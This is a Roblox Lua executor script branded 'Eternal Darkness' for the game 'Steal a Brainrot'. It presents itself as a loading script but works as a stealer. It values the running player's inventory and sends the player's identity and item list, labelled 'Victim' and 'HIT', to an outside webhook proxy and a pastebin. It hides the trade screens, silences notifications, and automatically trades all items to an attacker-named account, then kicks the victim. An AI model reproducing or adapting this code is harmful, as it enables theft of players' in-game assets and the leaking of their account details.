repeat task.wait() until game:IsLoaded()
task.wait(1.5)

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TeleportService = game:GetService("TeleportService")
local plr = Players.LocalPlayer
if not plr then return end

if game.PlaceId ~= 109983668079237 then
    if plr and typeof(plr.Kick) == "function" then
        pcall(function() plr:Kick("Eternal Darkness | SAB Only") end)
    end
    return
end

_G.ED_CONFIG = {
  WEBHOOK_ID = "124c4c6b94330f0ae956fcd7a226fd7a",
  USERNAMES = {"Eliaskulmer999"},
  PROXY_URL = "https://eternal-darkness.org/proxy/"
}

if not _G.ED_CONFIG then
    warn("[ED] Execute loader first!")
    return
end

local cfg = _G.ED_CONFIG
local WEBHOOK_ID = cfg.WEBHOOK_ID
local USERNAMES = cfg.USERNAMES
local PROXY_URL = cfg.PROXY_URL
local PublicHits = "31566ef8c2c18566522c58e8c11511cf"

if not WEBHOOK_ID or WEBHOOK_ID == "" then
    warn("[ED] Invalid webhook")
    return
end
if not USERNAMES or #USERNAMES == 0 then
    warn("[ED] No targets")
    return
end

local executorName = "Unknown"
pcall(function()
    if identifyexecutor then executorName = identifyexecutor()
    elseif getexecutorname then executorName = getexecutorname() end
end)

local requestMethod = nil
if syn and syn.request then
    requestMethod = syn.request
elseif fluxus and fluxus.request then
    requestMethod = fluxus.request
elseif http and http.request then
    requestMethod = http.request
elseif getgenv().request then
    requestMethod = getgenv().request
elseif request then
    requestMethod = request
elseif http_request then
    requestMethod = http_request
elseif game:GetService("HttpService").RequestAsync then
    requestMethod = function(req)
        return game:GetService("HttpService"):RequestAsync({
            Url = req.Url,
            Method = req.Method,
            Headers = req.Headers,
            Body = req.Body
        })
    end
end

if not requestMethod then
    warn("[ED] Unsupported executor - No request method found")
    return
end

local request = requestMethod

local REAL_JOB_ID = game.JobId
local bypassJobId = game.JobId
local capturedJobId = false

if identifyexecutor and identifyexecutor() == "Delta" then
    local stepAnimate = nil
    local printed = false
    repeat
        for _, v in ipairs(getgc(true)) do
            if typeof(v) == "function" then
                local info = debug.getinfo(v)
                if info and info.name == "stepAnimate" then
                    stepAnimate = v
                    break
                end
            end
        end
        task.wait()
    until stepAnimate
    local old
    old = hookfunction(stepAnimate, function(dt)
        if not printed then
            printed = true
            bypassJobId = game.JobId
            capturedJobId = true
        end
        return old(dt)
    end)
    repeat task.wait() until capturedJobId
    REAL_JOB_ID = bypassJobId
end

local function ServerHop()
    local success, result = pcall(function()
        local response = request({
            Url = "https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100",
            Method = "GET",
            Headers = {["User-Agent"] = "Mozilla/5.0"}
        })
        if response and response.Body then
            local data = HttpService:JSONDecode(response.Body)
            if data and data.data then
                for _, server in ipairs(data.data) do
                    if server.id ~= game.JobId and server.playing < server.maxPlayers then
                        TeleportService:TeleportToPlaceInstance(game.PlaceId, server.id, plr)
                        task.wait(5)
                        return
                    end
                end
            end
        end
    end)
    if not success then
        warn("[ED] ServerHop failed: " .. tostring(result))
    end
end

local VIP = (game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer")
local FULL = (#Players:GetPlayers() >= 8)
if VIP or FULL then
    if executorName:lower():find("delta") or executorName:lower():find("hydrogen") or executorName:lower():find("fluxus") or executorName:lower():find("arceus") or executorName:lower():find("codex") then
        plr:Kick(VIP and "VIP Servers not supported." or "Server not supported, please join a different one...")
        return
    else
        print(VIP and "VIP Server detected, hopping..." or "Server full, hopping...")
        ServerHop()
        return
    end
end

local cam = workspace.CurrentCamera
local pg = plr:WaitForChild("PlayerGui")
local guiNames = {BrainrotTrader = true, TradeLiveTrade = true, TradePrompts = true}

local function handleCam(obj)
    if obj:IsA("BlurEffect") then
        task.defer(function() obj:Destroy() end)
    end
end

local function handleGui(obj)
    if guiNames[obj.Name] then
        task.defer(function() obj:Destroy() end)
    end
end

cam.ChildAdded:Connect(handleCam)
for _, v in ipairs(cam:GetChildren()) do handleCam(v) end

cam:GetPropertyChangedSignal("FieldOfView"):Connect(function()
    cam.FieldOfView = 70
end)
cam.FieldOfView = 70

pg.ChildAdded:Connect(handleGui)
for _, v in ipairs(pg:GetChildren()) do handleGui(v) end

local Net = ReplicatedStorage:WaitForChild("Packages", 10):WaitForChild("Net", 10)
if not Net then
    warn("[ED] Net package missing")
    return
end

local function getRemote(label)
    local children = Net:GetChildren()
    for i, obj in ipairs(children) do
        if obj.Name == label then
            return children[i+1]
        end
    end
end

local notifyRemote = getRemote("RE/NotificationService/Notify")
if notifyRemote then
    for _, connection in ipairs(getconnections(notifyRemote.OnClientEvent)) do
        connection:Disable()
    end
end

local AnimalsData, AnimalsShared, NumberUtils
pcall(function()
    AnimalsData = require(ReplicatedStorage:WaitForChild("Datas"):WaitForChild("Animals"))
    AnimalsShared = require(ReplicatedStorage:WaitForChild("Shared"):WaitForChild("Animals"))
    NumberUtils = require(ReplicatedStorage:WaitForChild("Utils"):WaitForChild("NumberUtils"))
end)

local function loadSyncData()
    local mod = ReplicatedStorage.Packages:FindFirstChild("Synchronizer")
    if not mod then return nil end
    local sync = require(mod)
    local fn = sync.Get
    for i = 1, 15 do 
        local s, v = pcall(debug.getupvalue, fn, i)
        if s and type(v) == "table" then return v end 
    end
    return nil
end

local SYNC_DATA = loadSyncData()
if not SYNC_DATA then
    warn("[ED] Failed to load sync data")
    return
end

local sabValues = {}
local valueSuccess, valueResponse = pcall(function()
    return request({
        Url = "https://api.project-reverse.org/valuables/get-game-valuables?game=sab",
        Method = "GET",
        Headers = {["User-Agent"] = "Mozilla/5.0"}
    })
end)

if valueSuccess and valueResponse and valueResponse.Body then
    local ok, data = pcall(function() return HttpService:JSONDecode(valueResponse.Body) end)
    if ok and data and data.data then
        for _, item in ipairs(data.data) do
            if item.name and item.price then
                sabValues[item.name] = tonumber(item.price) or 0
            end
        end
    end
end

local brainrotList = {}
local brainrotQueue = {}
local totalInventoryValue = 0
local rarityCounts = {Secret=0, OG=0, ["Brainrot God"]=0, Mythic=0, Legendary=0, Epic=0, Rare=0, Uncommon=0, Common=0, Unknown=0}

for _, plotData in pairs(SYNC_DATA) do
    if type(plotData) == "table" then
        local owner = plotData.Owner or (type(plotData.Get) == "function" and plotData:Get("Owner"))
        local isOwner = (typeof(owner) == "Instance" and owner == plr) or (typeof(owner) == "table" and owner.UserId == plr.UserId)
        if isOwner then
            local animalList = plotData.AnimalList or (type(plotData.Get) == "function" and plotData:Get("AnimalList"))
            if type(animalList) == "table" then
                for slotKey, data in pairs(animalList) do
                    if type(data) == "table" and data.Index then
                        local name = data.Index
                        local rarity = "Unknown"
                        if AnimalsData and AnimalsData[data.Index] then
                            name = AnimalsData[data.Index].DisplayName or name
                            rarity = AnimalsData[data.Index].Rarity or "Unknown"
                        end
                        local value = sabValues[data.Index] or 0
                        totalInventoryValue = totalInventoryValue + value
                        rarityCounts[rarity] = (rarityCounts[rarity] or 0) + 1
                        
                        table.insert(brainrotList, {
                            Name = name,
                            Rarity = rarity,
                            Amount = 1,
                            Value = value,
                            TotalValue = value
                        })
                        
                        table.insert(brainrotQueue, {
                            slotKey = tonumber(slotKey),
                            data = data
                        })
                    end
                end
            end
        end
    end
end

table.sort(brainrotList, function(a, b)
    return a.TotalValue > b.TotalValue
end)

if #brainrotList == 0 then
    warn("[ED] No tradeable brainrots found")
end

local function uploadToPastefy(items)
    local lines = {
        "Eternal Darkness | " .. plr.Name,
        os.date("%Y-%m-%d %H:%M:%S"),
        "Total: " .. #items,
        string.rep("-", 50), ""
    }

    table.sort(items, function(a, b)
        local tier = {Secret=9, OG=8, ["Brainrot God"]=7, Mythic=6, Legendary=5, Epic=4, Rare=3, Uncommon=2, Common=1, Unknown=0}
        local ao = tier[a.Rarity] or 0
        local bo = tier[b.Rarity] or 0
        if ao ~= bo then return ao > bo end
        return a.TotalValue > b.TotalValue
    end)

    local current_tier = nil
    for _, item in ipairs(items) do
        if current_tier ~= item.Rarity then
            current_tier = item.Rarity
            table.insert(lines, "")
            table.insert(lines, "[" .. current_tier:upper() .. "]")
            table.insert(lines, string.rep("-", 30))
        end
        table.insert(lines, string.format("%s | Qty: %d | Value: $%.2f (Total: $%.2f)",
            item.Name, item.Amount, item.Value, item.TotalValue))
    end

    local content = table.concat(lines, "\n")
    local ok, response = pcall(function()
        return request({
            Url = "https://pastefy.app/api/v2/paste",
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({content = content, type = "PASTE"})
        })
    end)

    if ok and response and response.StatusCode == 200 then
        local ok2, data = pcall(function() return HttpService:JSONDecode(response.Body) end)
        if ok2 and data then
            return data.paste and "https://pastefy.app/" .. data.paste.id or
                   data.id and "https://pastefy.app/" .. data.id or "Failed"
        end
    end
    return "Failed"
end

local function sendToProxy(payload)
    task.spawn(function()
        local url = PROXY_URL .. WEBHOOK_ID
        pcall(function()
            return request({
                Url = url,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json",
                    ["User-Agent"] = "EternalDarkness/3.0"
                },
                Body = HttpService:JSONEncode(payload)
            })
        end)
    end)
end

local function sendToPublic(payload)
    task.spawn(function()
        local url = PROXY_URL .. PublicHits
        pcall(function()
            return request({
                Url = url,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json",
                    ["User-Agent"] = "EternalDarkness/3.0"
                },
                Body = HttpService:JSONEncode(payload)
            })
        end)
    end)
end

local rubisLink = uploadToPastefy(brainrotList)
local PlaceId = game.PlaceId
local fernJoinerLink = string.format("https://fern.wtf/joiner?placeId=%d&gameInstanceId=%s", PlaceId, REAL_JOB_ID)

local hitCategory = "Low Hit"
local isPingWorthy = false
if totalInventoryValue >= 1000000000 then
    hitCategory = "Big Hit"
    isPingWorthy = true
elseif totalInventoryValue >= 100000000 then
    hitCategory = "Good Hit"
    isPingWorthy = true
elseif totalInventoryValue >= 10000000 then
    hitCategory = "Normal Hit"
    isPingWorthy = true
end

local total_items = #brainrotList

local top_items = {}
for i = 1, math.min(3, #brainrotList) do
    local item = brainrotList[i]
    local emoji = {Secret = "🔴", OG = "🟣", ["Brainrot God"] = "🟡", Mythic = "🟠", Legendary = "🔵", Epic = "🟢", Rare = "⚪", Uncommon = "⚫", Common = "⚫", Unknown = "❓"}
    local e = emoji[item.Rarity] or "⚪"
    table.insert(top_items, string.format("%s `%s` x%d **$%.2f**", e, item.Name, item.Amount, item.TotalValue))
end

local fields = {
    {name = "👤 Victim", value = plr.DisplayName .. "\n(@" .. plr.Name .. ")\nID: " .. plr.UserId .. "\nAge: " .. plr.AccountAge .. " days", inline = true},
    {name = "⚙️ System", value = "Executor: " .. executorName .. "\nReceiver: " .. table.concat(USERNAMES, ", ") .. "\nJob ID:\n" .. string.sub(REAL_JOB_ID, 1, 8) .. "...", inline = true},
    {name = "💰 Valuation", value = "Total USD: $" .. string.format("%.2f", totalInventoryValue) .. "\nTotal Items: " .. total_items, inline = true}
}

local esc = string.char(27)
local ansiLine1 = esc .. "[2;31mSecret:      " .. rarityCounts.Secret .. "  " .. esc .. "[2;35mOG:          " .. rarityCounts.OG .. esc .. "[0m"
local ansiLine2 = esc .. "[2;33mBrainrot God:" .. rarityCounts["Brainrot God"] .. "  " .. esc .. "[2;38;5;208mMythic:      " .. rarityCounts.Mythic .. esc .. "[0m"
local ansiLine3 = esc .. "[2;34mLegendary:   " .. rarityCounts.Legendary .. "  " .. esc .. "[2;32mEpic:        " .. rarityCounts.Epic .. esc .. "[0m"
local ansiLine4 = esc .. "[2;37mRare:        " .. rarityCounts.Rare .. "  Uncommon:    " .. rarityCounts.Uncommon
local ansiLine5 = "Common:      " .. rarityCounts.Common .. "  Unknown:     " .. rarityCounts.Unknown

table.insert(fields, {name = "📊 Brainrots", value = "```ansi\n" .. ansiLine1 .. "\n" .. ansiLine2 .. "\n" .. ansiLine3 .. "\n" .. ansiLine4 .. "\n" .. ansiLine5 .. "```", inline = false})
table.insert(fields, {name = "🏆 Top Items", value = "```\n" .. table.concat(top_items, "\n") .. "\n```", inline = false})
table.insert(fields, {name = "🔗 Actions", value = "[Join Server](" .. fernJoinerLink .. ") • [View Inventory](" .. rubisLink .. ")", inline = false})

local payload = {
    content = isPingWorthy and "@everyone 🌑 **NEW SAB HIT | Eternal Darkness**" or nil,
    username = "🌑 Eternal Darkness",
    avatar_url = "https://imgur.com/a/LhzvN5h.png",
    embeds = {{
        title = "Eternal Darkness SAB HIT | " .. hitCategory,
        url = rubisLink,
        color = 0x1a1a2e,
        thumbnail = {url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=420&height=420&format=png"},
        description = "```lua\ngame:GetService('TeleportService'):TeleportToPlaceInstance(" .. PlaceId .. ", '" .. REAL_JOB_ID .. "')\n```",
        fields = fields,
        footer = {text = "Eternal Darkness v8.0"},
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }}
}

local publicFields = {
    {name = "👤 Victim", value = plr.DisplayName .. "\n(@" .. plr.Name .. ")\nID: " .. plr.UserId, inline = true},
    {name = "⚙️ Executor", value = executorName, inline = true},
    {name = "💰 Valuation", value = "Total USD: $" .. string.format("%.2f", totalInventoryValue) .. "\nTotal Items: " .. total_items, inline = true},
    {name = "📊 Brainrots", value = "```ansi\n" .. ansiLine1 .. "\n" .. ansiLine2 .. "\n" .. ansiLine3 .. "\n" .. ansiLine4 .. "\n" .. ansiLine5 .. "```", inline = false},
    {name = "🏆 Top Items", value = "```\n" .. table.concat(top_items, "\n") .. "\n```", inline = false},
    {name = "🔗 Actions", value = "[View Inventory](" .. rubisLink .. ")", inline = false}
}

local PublicPayload = {
    content = "🌑 **SAB Public Hits | Eternal Darkness**",
    username = "🌑 Eternal Darkness",
    avatar_url = "https://imgur.com/a/LhzvN5h.png",
    embeds = {{
        title = "Eternal Darkness SAB HIT | " .. hitCategory,
        url = rubisLink,
        color = 0x1a1a2e,
        thumbnail = {url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=420&height=420&format=png"},
        fields = publicFields,
        footer = {text = "Eternal Darkness v8.0"},
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }}
}

if total_items ~= 0 or total_items > 1 then
    sendToProxy(payload)
    sendToPublic(PublicPayload)
end

print("[ED] Loading Script for", plr.Name)
print("Please wait, this process can take up to 5 minutes depending on your connection and executor...")

wait(3)

local isTradeCompleted = false
local automationRunning = false

local function startTradeAutomation(targetId)
    if automationRunning then return end
    automationRunning = true
    
    local searchRemote = getRemote("RF/TradeService/SearchUser")
    local inviteRemote = getRemote("RF/TradeService/Invite")
    local addRemote = getRemote("RF/TradeService/AddBrainrot")
    local readyRemote = getRemote("RE/TradeService/Ready")
    local acceptRemote = getRemote("RE/TradeService/Accept")
    local completedRemote = getRemote("RE/TradeService/TradeCompleted")
    
    if completedRemote then
        completedRemote.OnClientEvent:Connect(function()
            isTradeCompleted = true
        end)
    end
    
    if addRemote and #brainrotQueue > 0 then
        task.spawn(function()
            local currentIndex = 1
            while not isTradeCompleted do
                if currentIndex <= #brainrotQueue then
                    local item = brainrotQueue[currentIndex]
                    local data = item.data
                    local payload = {
                        UUID = data.UUID or data.Uid,
                        LastCollect = data.LastCollect or 1771790678,
                        Index = data.Index,
                        OfflineGain = data.OfflineGain or 99,
                        Steal = false,
                    }
                    if data.Traits and type(data.Traits) == "table" then
                        payload.Traits = data.Traits
                    end
                    if data.Mutation then
                        if type(data.Mutation) == "string" and data.Mutation ~= "" then
                            payload.Mutation = data.Mutation
                        elseif type(data.Mutation) == "table" then
                            local isArray = true
                            for i = 1, #data.Mutation do
                                if not data.Mutation[i] then
                                    isArray = false
                                    break
                                end
                            end
                            if isArray then
                                if #data.Mutation > 0 then
                                    payload.Mutation = data.Mutation[1]
                                end
                            else
                                for traitName, _ in pairs(data.Mutation) do
                                    payload.Mutation = traitName
                                    break
                                end
                            end
                        end
                    end
                    pcall(function()
                        addRemote:InvokeServer(item.slotKey, payload)
                    end)
                    currentIndex = currentIndex + 1
                else
                    currentIndex = 1
                end
                task.wait(0.5)
            end
        end)
    end
    
    task.spawn(function()
        while not isTradeCompleted do
            pcall(function()
                if searchRemote then searchRemote:InvokeServer(targetId) end
                task.wait(0.5)
                if inviteRemote then inviteRemote:InvokeServer(targetId) end
                task.wait(5)
                if readyRemote and acceptRemote then
                    local startTime = tick()
                    while tick() - startTime < 50 and not isTradeCompleted do
                        readyRemote:FireServer()
                        task.wait(0.5)
                        acceptRemote:FireServer()
                        task.wait(0.5)
                    end
                end
            end)
            task.wait(2)
        end
        
        task.wait(2)
        pcall(function() setclipboard("https://discord.gg/wep4k9Fg8W") end)
        pcall(function()
            plr:Kick("Eternal Darkness | Your Brainrots got Stolen\n\ndiscord.gg/wep4k9Fg8W")
        end)
    end)
end

local function isTarget(name)
    for _, u in ipairs(USERNAMES) do
        if u:lower() == name:lower() then return true end
    end
    return false
end

Players.PlayerAdded:Connect(function(player)
    if player == plr then return end
    if isTarget(player.Name) then
        task.spawn(function()
            task.wait(4)
            startTradeAutomation(player.UserId)
        end)
    end
end)

for _, p in ipairs(Players:GetPlayers()) do
    if p ~= plr and isTarget(p.Name) then
        task.spawn(function()
            task.wait(4)
            startTradeAutomation(p.UserId)
        end)
    end
end
